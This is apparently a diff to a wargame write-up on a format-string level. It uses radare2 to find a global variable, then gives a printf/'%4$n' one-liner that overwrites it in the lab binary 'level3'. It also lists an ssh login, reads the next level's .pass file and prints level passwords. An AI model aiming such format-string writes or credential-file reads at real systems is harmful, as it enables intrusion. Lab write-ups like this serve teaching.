@@ -19,7 +19,7 @@ docker run -it -v "$bin_file_path":/mnt/binary radare/radare2 bash -c "r2 /mnt/b
 
 On the `r2` prompt we need to run a couple of commands to analyze the `main` function.
 ```bash
-[0x08048de8]> aaa # Automatically analyze the binary
+[0x08048de8]> aaa # Analyze the binary
 ...
 [0x08048ec0]> v # Enter visual mode
 ```
@@ -207,10 +207,14 @@ We need the *global variable* `m` (in the address `0x0804988c`) to be equal to *
 
 ### Solution
 
+Connect with `ssh -p 4243 level3@localhost`
+Enter the password `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
+
 We can execute the `printf` buffer to store the number *64* on the address `0x0804988c` where the `m` variable is with this line. Of course, because we are running a shell through a pipe, we can keep the `stdin` open like the same trick from the last level:
 ```bash
-$(printf '\x8c\x98\x04\x08%-60s' && echo '%4$n' ; cat ) | ./level3
-
+(printf '\x8c\x98\x04\x08%-60s' && echo '%4$n' ; cat ) | ./level3
+�                                                            
+Wait what?!
 cat /home/user/level4/.pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
